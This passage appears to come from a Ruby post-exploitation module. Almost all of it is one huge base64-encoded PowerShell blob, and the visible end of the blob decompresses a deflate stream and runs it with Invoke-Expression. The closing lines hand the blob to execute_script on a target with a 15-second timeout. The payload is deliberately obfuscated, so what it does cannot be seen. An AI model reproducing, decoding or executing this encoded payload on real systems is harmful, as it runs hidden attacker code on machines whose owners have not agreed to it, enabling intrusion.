wBRAEgAYwBSADgAdAB2AEIATgBoAEsAeABzAGgAdABhAHUAVAAvAGoAVABMAEcARgBEAG0AYwBsAGwAVgB5AEUAWABDAHoAbABOAC8ASwBvADAAQgBSAHEAYgB1AG8AbQBHAHMATgB2ADAAWABPAFcASQBPAEoARwBUAGIAYQArAEwAcwBZAE4AMQBzAEIATwBrAGUAbQBXAGIAcgBFAGYAWAB3AEQAVgBDAEYAbgBxAHMARwBvAHMAMgBNADQATQBIAEcAdgBtAGwAUABKAEgAUgBjADUAVwBoAFEAeQBlAFoAVwBCAEYASgArAEMAYgBPAHMASwBqAGEATABHAGEATwBNAHcANQBBAGcAQwBMACsAcgBPAHoAUgB5AHMAQgB0AGMAaQAvADIAZgBqAGQAdwA2AHEAWgBrADYAWABsAHQAMwBBAEkAcQBlAGwANQBpADQANgBDAHUAZwA2AHkANgBFAG8ASgA3AHUAQgBjAE4AWABBAG8AWQBQAE8AQQA4AGYALwBDADYAVgBiAGEANgBxAEgARABPAHoAVQBLAGkAQgB6AFEAbgBVAGEAcQBFADkAMQBXAHYAVgBaAEkAMgBNAE8AZQBzAE4AeABWAEoANgBtAFMAUgA5AEMANABiAHQAbAAxAHIAMgBRAE8AcgB6AE4AUABsAGcAKwAyAHMAQQA0AE4AcQBhAHkANgB3AGYAcwBBAHgAaQBtAHMATwA2AEIANQBsAHMASABNAFAAeABKAHQAdwA0AEsAbgBrAFEAaAB0AG4AYQBNAG8AKwA2AFAAOQBNAHMAeABuAGsAbAByAGwAaQAzAFcANABtAGwARgBuAHAASABCAFUAQwAzAGgARQBmAGUAaABXAGoAaQBaAHUAdwBtAEQAWQBqAHQAOAB5ADgAaABhADkAUQArAC8AcgBDADMAUwBuAFoASgByAFAAUABlACsAYQBYADkAWQA1ADUAdABKAGsATAB1AGMAMAAzAEMAVwB6AFoAbQAxADcAagBzAHIAcQA0AC8AUgBMAGUALwBGAGgASwBFAHMAYwAxAFEAdQBpAE0AawBNAEIAWgBiADkAUwBOAHMAdQB0AHEATwAvAEsASABxAHIARQA0AHMANgB4AFYATgB0AEUANQBIADgAVABxAGMATgB2AE8AYQA5AGMATwB3AGoASgByADkASwBBAGMANgA2AHMAbwBCADQAMgA4AEoAbQBDAHoAdwBxAFAAeAByAC8AYQBmAHcAeABGAEgARwAwAG0ASQB5AFgATQBoAGEAeABqAHkAUQBZAGYAbwBrADMAdABSAHoAaABkAGoAcQAvAEEASgBnAG4AOQAwAGYANwBIADAATQBXADIAVABrAFcARwBOADQALwBoAHQAagArAFUAVgBUAC8AawBNAEQAZwBFAFQAaQBzAG4AZQBQAHgAZAB5AEsAYgB2AE0AagBnADUAWAAvAHQAQwA0AFAAUQBwAGMAVgAyAEMATgBuAFUASQBwAGYAZABzAC8AYQBLAEgAVgBjAGIAMwBNAEcATQBmAGcASAB2ADgAQgBhAHoANwAzAHgAMABRAHUAUABBADkAYQBoAHQAMwBmAHIAUgBrAGQAVwB4AEwASwBlAHoAWgAvAC8AaABoAHkAUABMAHUAZgA1AGYANgArAFkAMwA5AGgALwBnADAAeAA1AFUAeABOAGoAWgA2ADYAaQBaAG0AdwBTADgAdgA2ADYAVgB4AEUAbQBDADUAegBvAGYAUgBuACsAKwBNAEsAbwBiADcANQA0ADcAbQAzAFQAZwA0ADEAOAB2AGwAbwB0AE8AZQArAHoATwBRAEIAeQBNAGQAWQA0AHUAYwBSAHYAdgBBAGIAOQBzAHEAUwBVADIANQBOAHIAZABLADIAQQBQAG4AcAAyAC8AZABiAC8ANABpACsAVwBDAC8AQQA3ACsAdwBEAGMALwBaAE4ALwAyACsALwAyACsANAA3AEEAYwBxAHQALwB2AE0AYgA3AG4AYQA3AEsAcgA0AGgASwB1AEwAVQBiADEAbQBXAHAAcQBLAEcAdwBnADcAUABYAFoATgBzAEsAKwBIAGsARQBEAEUAMABHADcAbwBmADkAMgA5AEsAYQBoAFgASQA2ADkAVAAyAEYAMABGADkARABKAGoASABYAGwAWAByAEMARABpAG8ANwB3ADIAZwBZAGEAVQBSAHQAWgBGAEoAWQBIAEgAegBJAG0AVwA0AHoARgA2ADYAZABsAHgAWAA0AFQAMgBiAEwAdgBSAGoAcQBLADIAdwB6AEoAQgB2AHcANwBwAFgAaQBzAHYAcwAzAEgATwBNAFYAUgBZAEgARQBXAHgAVwA4AEoAaAArAGoAOAA1ADAARAA0AFIASABGAFMAbwB0ADAAVgB5AFkAMQBUAE0AagBSAFMAUgA4AFoAUgBEAHUAQgA2AEgAOQBLAGEALwBZAE0AYgAwAHYAMABMAEIARgBGAHgAawBzAEIAZABPAEcAZQBJAE8AdgBRAFoARABQADEAdABkAFMAagB6ADQAOQBjADMATgAyADMAZQBvAFEARgBpAEUAUwBJAHMAQQBvAEkAaQA3AEIATABpAHMANAB6AHMAZgAyADgAbwBvAC8AbQB3AFkAZQBBAGoAQwBuAEwAUwBhAEgAbgBMADUAVwA0AFgAYwAvAEsAdAB3AFcASwBHAEMAcgB4AGYAcwArADIAagA0AHcAcQBSAFEAMQBKAHgATABTAEkAZwB1AEwAOQB4AEIASwBYADIALwBnAHQAYgBoAFkAMQBwADQATAA3AEMAZwA4ADcAKwBDADIAMQBEAHkANABRADMAdwA2AG4AQQBmAGUARABVADcAbgBtAFUAWQBwAGUATQBRAEIAcQB5AHQAVABiAEcASgBWAGEAcgBpAHMAbwBzAEIARwBQAFMAeABpAGIAcgBsAEkASgArAGIAbwBoAEsAWQBMAGYAdAA2ADYAVwBQAG4ASQBPAHIALwBTAC8AMQA1AG8AUgBHAHEAYQA4AHAAdABSADEAQwBPAHQAYQBTAHoAeAAzAFYAVABjAEMAQwB1AFcAUgBEAFMAcAA0ADUASwA0AEcARABEAGMAdABZAHYANwBHAGYAZABaAFUAaAB6AE8ATAB4AHUANwBNADUASQBkAGgAeQBKAEoASwBIAGIAMAB5AEYAdABjAHYAcwA2AFMARAA5AEkAdgBNAEYAKwByAFgASwA0AHoATQAzADUAcABNAFoAdgBkAHoASwB3AFQAUABEAFoAcwBmAFkAcABwAHYAZwBKAEoAOABmAFcAQgBXAGMAdwBVAFgAeQBtADcAeABEAFEATwB3AGcAbAAxAFkAUQB1AEMAcgBuAGgAKwByAEoAWQBCAFcAVwBWAGIAMgBYAHcAOABEAHMAaAA3AHYARgA2AHMAMgBLAGEAMQBUAEcARgBFAEcAZgBzADIAVQBsAGQAZgBXAHcAdQBMAE8AdQBtAFEAUQBSAHEAVwBZAFMAMwBLAG0AYgBCAEYARwA0AFoAaABMAGMAcQBjAHAAZQA4AGQAMwBsAGEAZQBxADkANgBtAHEAVgBIAEwAcQB5AGEAbQBWAEUAQgBRAGgAWQBEAEYAcABFAGUAVwBiAEoAaQBpAHYAVABpAHAAUwAyAFAATABPADQAWQA1AGcAawA0AGkARQBYADUAcwA3AEIAdABRAG8AUABQAGQARQBUAEEAWAB2AFkAcQBXAFQAVgBCAHYAbQArAGMARgAvAFIAUgBGAEEAdgBrAFYAMABEAG4AbQBmAGgANQArAGcAVAA3AGMAcABNAHUAawA1AE4AdQA4AGYASgBiAEkAawB1AGoATwAyADMALwB0AEUAMgBjADcARgBqAFkARQBhAG4AYgBGAFkAbQAzAHkASABKAHYAMgBKAE4AKwB5AGwAdABnAHAAOABtADgAZwBwACsATwBaAEcAZABIAGQAeQBhAFIASQBPAHIAKwBhAFEASgBGAGkAVgByAHEAZQBDAGgAVQArAFEAVQBCAGEAcQArAGgAaQBqADgAWgBQAFAASABLADMAZABDAGcAQQBMAHgARQBFAE4ASwBlADIAUQBZAHMAZwAzAE0AKwAyAGkAWgB5AE0AMQBLADEAZwAyAGIAWQBjAE8AcABGAHkAVQBKADYARQBaAHcATAA1AHQAcQBLAGoAbQBKAHYAdAB6ADEALwBrADIATwBoAHoANQBTACsATQBXAFYAZAB0AG8AUQBMADcAUABjAEoAaQAzAEwAWgBMAEoAUwA3AFUAdgBMAEQAQwBwADcAawBtAEEAQgA0AEsAZwBRAFcAcgA1ADcAYQBnACsAZQA5ADAAbQAzAGcAUwBaAHkAMwAvAGMAMABtAGkAaAB4AGgAbgBLAHUAbwBZAEwASwBBAEcAdQBJAEsAaABXAGkAdQBnAEgARgBUAFQAYwBwAFQAUQA2AEUAUAAyADMAbABZAHoAZABhAFIASQBJAG8AbgBFAGwAaABOAGQANwBQAHIATgBuADkAZQBNAGoARwBSADAAdgBKADIAdABKAFMAMwBpAG8AdQB5ADQATABFAEsAaQBiAG8AWgBLAHUASwBVAFQAUQA1ADYAUwBGAFYAWgBDAG8AYgBaAEcAcwBLAEcAaAB0AGsAcgBDAHoAcQBLAEUAawA3ADQAeABUAHYAKwBaAEgATwBMAGkAZQBrAGYAQgBtAGYAeQBuAEMAeAB3AE0AZABkAEcAbQB5AGgAWQBmAG0AUwA4AFgAUgBkAEEANAB3ADkAegBBAGQAMQBpAFgAVQBOAEMAbQBWACsAUQBzAFoAdABLAFcAZgBiACsAaABtAHUAaQBpADQAdQB0AGsAbgBIAG4AQgBvADgAVgBKAEYAKwBlADYAUwB1ADMAUgBzAG4ALwBtAEkAWQBUAHQAZwBKAFgAbgBXAEsARQBmAE8ARwBWAEMAbQBKAGsAawBwAFQAaQBYAEQARwA3ADUAWQBaAE4AdAB3AGUAdABJAHcAWQBLAFgAZgBXAEwAZABQAFMAVwAwAGoAYwB3AEIASABUAHkAYQByAHUANgB6AFkAZABqAEYAYQBzAGgANQBmAHUAbABjAHgAdgBhADUAMgBZADYANgBOAEMAbABoADkAcQA4AEgAVwByAHkAcABMADcAVgBSAHUAMABJAFkAOQBQAHYANAB6AHIAVgBQAEIAdAA1AGsATwBsAC8ARAB6AGMAWAAxAHUAVgBPAHgAMwB3AEcAYwBUAGoAOABlAEMAUQBQAFUAMwBHAGoAMgBJADkAaAByADEANABiAEsAeABuAHMAUwBZADMAVQAzADQARABZAHQAMgBIAG0AKwBKAFoARABwAG8AcgBDAG0AUABVADQAMwBPAEoAbgBOAFcANwA1AFIASQA3AGsAOAB1AE8ASgBoADkARABiAEgAVQAvADQAUQBrAHoARwBTADIARABNAFcAWQB4AHAAVABKADEASQA4AFgAaQBOAEgAYgBDADUAZwB1AGkATwAyAFMAUwA4AEYAWQBnAFAATgBMAGQAbABmADcAZABjAHAATAA2ADEATAAwADAALwBrAEEAWgBYADkAawA5AE0AYQBkAFYAaABhAGQAcQBJAFAAcgB0AGoATgBoAFoARQAyAHIAVAB5ADMAOABzAEkAdQB1ADYAeABFAEcAWgBpAFcARgB1ADQANwA2AEIAZABuAFMANQBJAFcAawBGAFoAMQBwAGIAegBTAHYASwBzAEUASAAvAGkAOAByAFQAawBNAFIAcgBHADAAUgBWAHkASQA3AHAAawBMAEIAbQBWAHYAMQBwAG8AUwBHAC8AMgAzAEoAYQBxAE0AYwByAFkALwBYAFkAZwB3AEoAVQA5AEMAbQAzAGkAMQBEAFMANwBJAHgAdwBhADgATABaAGYAbgAxADIAMABUAHcASwA4AFgAMgBJADMAYQBOAFEAZgBVAFIAcAA4AGEAZABmAEgAKwBiAFcAYwA5AHgAMwBjAHUAdgA2AGEAZQB2ADYAQQBXAGUAYQAyAGgAUQB5AFAAagBFAGYAbQBsAFkAUABQADIARgBrAGcAOABQAFAAcgBkADMAUQBPAHoAUgBXAEcAegBZAEoAVwBUAHQAWQBVAEcAdABxAGcAVgBCAEUAcABiAEYAZQBOAEoAeAB0AGIAUwBBAGEAZQA3AEgAVwBRAEYAVAB1AEgAQwAwAGUAagBTADYANgBRADkAdABGAEQAegBBAEgAdwA1AHMASgB0AEQANgBqAHUAcgBQADgAYQBrAEoAWABJAFEATgBaAHMAVgB2AG4AcwBsADMAcQBUAFgASwBVAGsANABYAEcAYgBNAGoAZgA1AFYAQgAwAFgAdwB2AHEAVwBIADkAdwBjAGQANQBzAHAAdgA2AFkAOQBUAEwAbQA3AEwAUQA1AC8AYQBUAEMAZwBOAFoAagAyADUATQByAHoAYwBtAHIAMQBpADYATgB5AFYAcQBwADkAVgBXAGIAawBsAGUAdABoAHoAVQBrAG8AMgAyAGEARwBwAEwAMQBjAEIAWgBnAGwAQwBvAGsAaABEADIAYgBsAGEAWgBQAGUAVgBzADAAVQBLAHcAYgBOAGcATwBiAE8AMwA3AFgAcgBRAGYAMgBLAG0AcwBjAFIAegBPAHUAeAAwAHYARAB1AGsAeABVAFAAYwBxAE4AdQA1AGYAVgBiAHkAbwA5ADkAUQAzAE0ARgBlAFMATgA0AGkAMgB5ADQARwBvAHYAdQBpAFEASABLAHMAVABjAFEALwBEADEASwBsADMAawAyAEgAVwBrADIAQgBXAFAAbwBYAEMAdAAzAEcAOQBlAE4AQgA0AHAAbwAwAFUAdgBVADMARgB2AFEAMABlADgAMQBzADYAcwB0AFQAawBlAHEAawAzAEsAbQBSAGYAZgA0AEwAdQBaAFAARQBvAHAAcABIAFgAZgBhAEIAVwA4AHEAawAwADgANAB5AHkASgA5AGYAZABWAGkAUQBsADUAbQBGAHIAZwBsAGEANwBUADAAdQBhAEMAZQBDAGoAawBTAE8AVgBrAHgAZAB0AFUATwBhAHIAdwBVADMAUQAxAG0AZgBsAFoANABxAFkAWQB1ADQAbQBiAHoAVgByAEQAQgBhAEEAYwAzAGkATABDAGQANABmAHQAMwBDADQAdQAyAHIAKwBGAE0ARABaADAAagBHADkAYwB6ADkAUgBGAHYAdAA1AGcARgB1AHQAVwB2AGMAVQBWAHYAZQBmADgASQBUAFAAbQA0AGQAVwBFAHUAZABKAEoASgA1AHIARQAyAGUAZABXAGYAYQB1AHYAZwBMAHEAbAA3ADcAVgBkAGsAawBuAEQAdgBsAFoANwAxADgAWgBXADUAeQBHAGQAcgBZAEoAYwAyAFYAMwBvAFQAcABxADEARgBaAEoAKwBwAHcANABOAEUAVQBLADEAUwBQAHEAVQBCAHoAYQBsAC8AawBvAEcAWgAzACsAMwBIAGUASwBhAEYASABIAFgAagBsAGMAVgBoADIAbwBEADYAZABmAHMAawBaAFYAUwBZADgAMgB4AEoAcABtAFYARgB2AHAAWABhADMAMwA5AHgAMgBqAGwAdwA1AHAAVgBEAGMAcQB6AHIAVgBsAFYAawBzAE8AQQBpAE8ARQBNAFYANwBXAHIAWQBZAGUAQwBjADYAdgArAHMAaAAwADkAQQB3AEoAYQAvAHMASgBqAG8ARQBsAFoAZQBhAHAAbQBhAEcAeABWAE0AeAB5AGUAKwB0AFIAMwB2ADEAYQBmAG4ATgAxAFUAeABPAGsARABUADkANgBlAE4AcQB6ADIAWQBPAFQAVABQAGkAVgByADYAdgBpADQANQBDAC8AOQBZADMAbAA5ADcAYQBPAGQAYQBqAFYAUQBuAG0AQQBHADAAOABQAFgARABiAEYAbgBiAE0AbwBWADYASABYAC8AcABtAGIASwArADUAUwBPADgARAAwAFcAOABnAFcARABXAGgAVgBaAEgAWAA1AEYASgB6ADYAZQBlAGMASwBWAGMATwBJAG0ARQA3AFkAVABvAHQAVgBzADIAKwBlAEkAaAA2ADkAMwBtAHoAUgBNAGsAaQBqAFIANQB4AFMAcQBJAG0AWQB6AHMANwArAHUAWgA1ADgAcwBwAGUAegBLAGMAbAB5AHEAbABVAGQAaQA4AEQAYQBtAEoARwBJADQAeQBiAHQATwBWAE0AYgBxAHoAOABLAFkAcwBKAEwAMQBZADcAbABqAFgATABNAG8AWgBNAHUATwBEADYAUQBZAEgANABEAGgAawBEAGEANgBRAHcAMAB4AFIAUwBTADkAVgB5ADUAbwBBADcAUAB0AE8AawA5AFoAZwB5AFgAegBQAHYAdwBKADMAcwAzAFIARwBpAEMAQQBKAEoAKwBJAFQAbwBDADAASQA1ADEATQBpADUAcQBRAGEAVQBhAHkATQBaAGsAUABTADAAbwBhADUAeABzADEAVABxAHIAdwBUAC8AbgBoAFYAKwBuAE0AcQA1AHgARABHAEYAUgBsAFkAdwA2AEIANAAyAHQAeQBpAEMAWgBLAFoAVQB3AHYARABEAGoAbwA2AFkAVwArAGEASAAxADYAOABlADEAUgBJADQAdgBTADgAZwBzAE4AZABsADEAKwA4AFUAOQBuAFUATwBhAEUAMABHAEEAUABtADQAVQBKADQAeABzAEwAcwAyAEkANQBaAGwAbABXAFUAUwBqAEoAVQBsAHQAegBCADEAbQBhAEQAVgBLAFgAcABRAHEANwBWAHAAYgAvAFoARQA3AGoAWQBUAG0AagB3AFEARgBzAHkAUgBtAHIAWgBQAEcAMwBWAHoASwBZADUAMwA1AEkANwBXAGIASABHAE0AVgBaAC8AOABmAEUAVQByACsARgA4AHYAbgBrAFoAaQBuAG4AVgBoAGQAbQBEAE8AOQAvAFoANQB1AEUAWABYAEUAQgBJAGUAKwBRADYAZQBrAEQATAA5AC8AOQBQAEwAdwBhAC8AVABnADgAUAA5ACsAYQBHAGIANQAxAC8AZgBCAEQAOABlAGIAbABNAHQANQBjAEsALwBhAEwARgBGAEYAdQA4AHMAcABOAHMAZAB6AG0AcQBPAEQAcgBMAGsARgBCAGMAZQBaAE0AWQB1AE8ASQB2AHkARgBOAGIAWABoAEgAMgAvAEwATAB6AFUARABxAEoAbABKAHAAZgAvAEIATQBlADcAMwBqAEIATAB3AEQAZQA4ACsAaQB1AHQAcwBLAEkATQBlAGcAeQA5ADEATABmAEYAMQBsADIAMwBkAFcAdABXAGkAQQAvAFUAVQA5AGYASgBrAGEAcABGAGQAbwBGAE0AZABCAHcASwB3AFEAVQBIAEsAYwAwAHYANABXAFEAeABSADEAQwB0ACsAUgBiAHoAcwA5AGwAcQB5AHkAWgB6AEYANABxAEwAYwAyAHIAQQBNAFUATgBnAFgARwBOAFgAWQBqAE0ATQBsAGoAbgBKACsAagBXADEAcABBAHYAQwB3AEkAdAA4AE8ASgA5AFQANgBFAGQARABTAGEAaABYADcASwAzAG0AMwBJAFgAaQBrAEkANgA3AEwAagBXAGEANwB5ACsAagA2AHgAKwBUAGgAbABWAEwAeQB1AFUAdQB6AE8ANwBRAFAAYgBpAFQAMABjAG4AWAB6AEgAOQBzAFQAeABCAGQAdABmAC8ATQB5AHgAMQBGADQASwBvAFcARwBpAGoAQgBEAGYAUABqAEMARgBJAHgAWAAxADAAdwAvAEIAeQArAHUATABSAFgAbQAxAEkAdwArAGcAOAAzADMAaQAwAHAATQBCAFcANQBFAGYAYgBFAFgAZQA4AE0AcQBDAE0ARQBzAGkAcwBPAEIARgBuAEoAawBGAFkAZgAzAHMAaAA1AFAAbwBMAHUAVQB2AE8AMgBmAFYAeQBjAGYAdwBKAEkAcgB2AEUAMwA4ADIAegA0AGgAOQA0AHAAQgBCAGYALwArAEEAdgBQAFcAOQBKAEUAcQBqAGEAVQBaAE8AeABIAHMAdwAyAFQAdgBQAFEAZgA4AEkARwA1AGwAaQBIAHkAYwBlAEsAawA1ADYASAAwAFAAKwBmAEoAdAB0AFgAWQA1AFkARgBtAC8ASABkAHgATwBuAHgANQBRAGIAMAB2AGUAWAB4AEYASwBPAEwAZABvADUAYwBoAHUARwBGADYAUABGAEEAZQBnADQASwBrAG8AbwB5ADkATABZAGEATgByAC8ASwBUAFUAcgBiAEwATgBZAHkAZQA4AGEAdQBaAGsAZgA3AEUAQQBEADAAZgBSAGUATwA3AEgAZgBzAEIAcAArADUAUwA4AEYARgBHAC8ATwBWAEgAUwAxAGMAQgBFAGIAVgBEAE8AUABWAEUAUgBIAFEAQgAxAGUAMgBKAHEAcQBxAGQAegBZAGkAdQBZAGMALwBuAEwAYwBDAGkASQBWAGoAVABXAFEAUABuAEgASwAyAHQAKwBkAEUATAB0ADQAcwA2AHgARABqAHMARwAvAGYAMgBhAHYAVAAxAFYAZQBxAGwAdAAwAFgAVABRAHcAaQBWAGMAUgBxAEEAUgBxAHcARABMADAAUABmADcANgBZAFkANQBpAFMAbwBiAHEATwA1AHgAbABPAFkAdABjAFoAWAB4ADUASgBkADUAUwBMADAAWQByAGoARABXADkAZQAwAGgANQBwAFcAdgAxAHYARQBVADkASwArAEMAeABqAFEATQBkAHMASQBLAEIAeQBIAEIAVwBWAFcAOQBWAEcANQBWAEcARwB6AG8AeABhAEcAdgB4AHcAcAB1AFMAdABxAHUAUABkAEoAaABPAGYAMQBCAEwAUwByADEANAB4AFEASgBWADQANwBmAFAAaABuADgAeQAyAEYAVAAxACsAVgBMAHQATQBFAC8AcQAwAEMANABMAHQAVAA5AHMAQgBOAGoAZQA1AEsASQBhACsAUgBIADkAaABLAGoASQBhAHgAVQBIAHEATgA0AHYAKwBjAFcAeQBiAFAATABwAEsAbQBuAEcAQQBWAFgAUQBSAGgAZgBWAFIARwB0AEsAdwBzAC8AYgBmAHMAUwBSAHgAMwBiAHIANQAzADgAYgByAGQANwBzAEYAVgBXAG0AcQBaADUAeAA0ADIAbAB5ADQAUwA0AFMAWQBXAGYAOABMAFMATQBzAHcAOABsAGQAcAA4AGwAOQBHAEYAYgBkAGEAbQBNAGkAMQBUAGIAVABMAG0AdAAwAGoAZQBoAHQAYgBEAFQASQBSADEATQA2AEwAUQBQAC8AeABUAGkANAByADMAQgB3AFUATQA5AEIAOQBmAHgAcwBDAHIAVgBRAEUATgB5AFgAMgAyAGkAMwB4AFIAOABzAEUAZABCAFQARwBzAE8ATwA1AEQAUwByAEkAMAB4AHMAMwBpAG0AdwBLAGwAMgB2AEQARgA2AHUASQBSAFYAcQAxAHIAdgBWAEQANgBXAHkAQgBPADYAKwBPAHgAOAAyADMAWQBUAG0ATAA2AGwAdQAwAG4AYgAwAE4AZAA2AHgAcQBBAEQAZwArAHgAaQBHADUAdwBqAHoASABlAFgAeQAyAE8ASwBsAFcATgBJAFoANQB3ADgANABsAEkAZQBLAE4ARgAzAHAAKwBXADYAKwBBADEAYgBQAG8AVwAyAG4AYgB0AHMANgBaAEYAYgAxAFoAMQBaADYAWABTAHgAQwBBAGQAdAB0AFEASwBBAE8AZgAyADIAQwA5AGEAagBDADMAawB5AFgAcQBiAGoAbgBQADYAcABsAEcANABTAGwAMAA4AEYALwBmAEkAeQBvACsAVgBVADMAYgBOAGkAMABLAEUAMQBKAFYAbABSAGsAVgBTAC8ARQBiADQAOQAyAEIAYwBwAFYAeABRAEIAVAA2AGgAQgByADkAYwAyAGYATwAxAHoAdgBzAHIAMwBRAFIARAAvADAARABiAFEAUwBPAGYASwBSAHIAUABKADYANQBZAEgARgA0AFoAVQBKAG4ASwBSAEUAWgB0ADYAMQA0AE0AUgBBAGwAYwBhAHEAegA5AG4AaQBSAGYAVABCAGIANAAvAFAATAB2AEsAUgBHADMAWQAyAHQAbQAxAG4AeQBFAGcAMwBLAEwAbQBlADgAdQA3AEcAcgA5AHMAVQAvADQAcgBiAEYATAB0AHQAVgBQAHoAcgA3AEUAbwBZAE0AQgAxAG8AbQBBADUAMABUAEEAYwA3AFkAVABwAG8AaABxAGsAcABQAGYAdQAxAE4AdgA4ADMAcQA4ADEAMwBxAHgAZgBLAFMAbABpAHUARgB3AFoATgA2AG8AVgBmAHkANgA0AG4ASwBiAHYATQBFAHEAbABoADQAKwBBAFgAWgBlAE0AdgBWAG4AcwBOAEQATABYAFgAUQBLACsAOQBCAGsAOQBjAGUAdwAyAHMARQByAEIALwBrADQAcAB4AFEAMABLAG0ARAAzAHcAegB2AEIAaABlADQAVwA4AEIAWABCADcALwArAGYAegBkADgAYQBrACsARgBsAFYANQBXAGYAdwBFAFEAegBVAGEANQBoAGcAZAA0AHEAcwBCAHIAYQBMADIAUQBoAGMAbwBtAG0AeAB4AGIANwBzAG8ATwB0AFgAUQAvAFQARgBjAGkAWABmAEIAcQBTAC8AegBFAEQAOABnAHMATwBZAGwAegBwAHIAdABwAHoAdABHAHkATgA4AGEAUQBVAHYANwBOAEUARgBYAFgAeAB6ADYANABBAFYAeQBxAHoAVwB0AG8ATAAwAFoAOABzAEYATABNAFAAVQB4AGcAYwAvAGYANwBLAGkARAAxAGgANgBkAFEAMwAvAEQAbgA1AGoASwBKAFcAQgBoADkAZwAwAHgAZgAyACsAdgA4ADUARwBGAGwATQA1AGUATwA5ADYARAB2ADcASQA5AGgAMQBoAHEAVQAxAHoAZAB4AEwAYQBIAFUALwBrAFAATAA1AGYAbgA0AG4AOAB5AC8AVwBRAC8AUQBWAFAANgA2AFkANgBOAGUAbgBOADYATQBYAG8ANgB2AFEARgBnAFgAMQBkAHYASAByAE4AQQBRADcAMQA1AHoAQgBKAGIAOQBNAFkATQBXAHUAaQBNAGYASgBjAEYAKwAxADEAUAA4AFcAdgBSACsAUQAvAFUAeQBIADIATABYAG0ATgBsAEUAVQByAEMASAArAFQAYgA2AC8AQQBmAFYAUwA4AHAAVABEAE0ATgBHAFoAOAA4AG8AVwBjAEIAWQBGADkAWABRAHgANgB6AFEARQBNAE4AZQBjAHcAUwBXAHoAVABFAEQATABxAHgAVgAyAEUAUABKAFQANwBBAG8ANgBqAHoAMQBqAHgASQA0AFoAcAAwAEIAMQBjAHkATwBKAFMAOQBrADEAWgBqAGQAZwB5ADIAYQBjAHYASgAyADkATQBIAGMAbgByAFEAVABGAHMAZQBzADAAQgBEAGIAWABuAE0ARQBsAHUAMABwAFEAYQAwAEoAbgBGADgASAB3AHAASwBtACsANAA1AGIARQB3AHAAWAB0AEMANABxAFgARAB6AHAAaABpAHIAWgBoAFUAVAArAE8AMgAvAEkAMwBYAGQAdgArAG0ATgBvADMATwBFAGIAdgBOAGYAYwByAEsAVwBrADcAagAwADQAcgBpAE4AbQBPAFcAWgB6AHgATQBwAG4AVABsAHgAZQBGAEsAMQBlADkAdwBTAGoAMABxAEEAbgBrAGoAMQA2AGwATwBnAEwAVAA4AFYAdABxAG8AbwBqAG0AMQBwAGkAVgBIAGQAcgAzAEwAbABLAFkALwAyAEMAdQBBAE4AYQB4ADMAVQByAFYAVwAvAFEAcAA1AGgAVgBZAGMATQBOAGkAQwBoAHYAVgBXAE0ALwBWAG8AOQA0AGIALwBMAEoATQBQADEAdQBxAG4AcQBRADUAVABlAFIAZgBYAHoANQBPADIASgBWAE4AKwBjAG8ARAB5AHAANgBqADkAdQBpAFUAZgBsAGMARQArAGsAKwBuAFgAQQBOADYAdgA5AFQAdQBuAGQAVgB0ADEAKwB0AHIAdAB1AGIAOQBMAHAANgBxADAARABjAFMAdgBQAEcAeAArAGkAOABDAFkAaQBEAEUAcQBmAGUAVAB2ADUAKwB6AHcAZgBmAFMASwBsAE4AKwBkAGMAVAA2AHIAMABqADEAdgBpAFUAVwBuAHAARQB5AGwAOQBIAGYAQgBmAGYAYgAxAEoAOQBYAGMAbwBzAEUAQwBoAHgAUQBuAG0AVQArAGIATgBIAE8ASgBYAHoAcAAwAGYAdQBVAGoAVAAvAFAAbQBSAHkAMgB6AEwAbwBlAHYAQgAxAHkAdABVAHgAUABTAEQAUAAyAEMAdQAxAGsAdQB4AGUAUABhAHgARgBpAGsAcwB2AGsAeQA0AGwAUAByAE8AZABXAHkAawBOAGoAMABDAGQAaABWAGcAdQBTADYAMABLADgARAAxAEkAYwA0AHUARwA1AGYANgAyAEsAdgBoACsAUAAzAFYAUgBUADcAbABWAE0ANABaAFYAWABjADcAWgA3AFIAeQBXAHAAUwAvADUASwBuAHkAUwAvAFkAOQA1AGEAaQBUAGEASwA5AFgAeAB5AGMANABYAGoAdwBUAHIAUQBqAFgAYQBnAHUATQBQAEcAVwBGAFkAZQA5AEQASAArAEUAcAA1ADYAMABhAHYAWQA1AGEAeAA4AHcAMgBvAEcAVgBFAFIANABPADEAZgBoAEEALwA5AEUAbgBEAFAAdwAxAFAAMwBsAGUAMwBrADkAdgBGAEkANQBiAGkAYwBJAEoAdgBvAFMAdgBGAEYAbwAzADEANABMAHIAeABaAEUAdgBDAEEAOQBWAGkANwBaAGsAcQBHAGMAbwB1AHUANQB0AGsAMwBWAEYAQQA4AFYAZgBQAFUAKwBXADkAawBoAFUAZQB4AFQAVAB6AG0AWABJAE8AUQA4AHgAdgBKAG8AZgBrAGkAcQBiAGkAVwBVAHQAbAA0ADMANgA5ADgAYQAxAEIAMgAxAEMAUwBIAHIAYwA0AEIAaQBtAG8ARgAzAE4AcgAzAHAANABxAGYAOQBOAGIALwBrAFEARQBIADYAMgA1AGUANgBXAFgAZwBGAEYAWABOAEIATgBFADAANAA2AFkANABOAFEAZQBCAEIAaQBsAHQAbQA2ADEAUwBqACsASwAvAGgAegAvADQARQA5AGIAdAAvADQAUABXAFoANwBQADAAdwA9AD0AJwApACkAKQA7ACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkAEIAeQB0AGUAKAApAHwATwB1AHQALQBOAHUAbABsADsAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAQgB5AHQAZQAoACkAfABPAHUAdAAtAE4AdQBsAGwAOwAkACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoACQAcwB0AHIAZQBhAG0ALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQA7ACcATQBPAEUAbwBzAEwAWgBmACcA"
cmd_out, running_pids, open_channels = execute_script(testscript, 15)

# you can replace this compressed script by using the functions above
# Execute the powershell script
#print_status('Executing the script: ' + script)
#cmd_out, running_pids, open_channels = execute_script(script, 15)

# Default parameters for payload
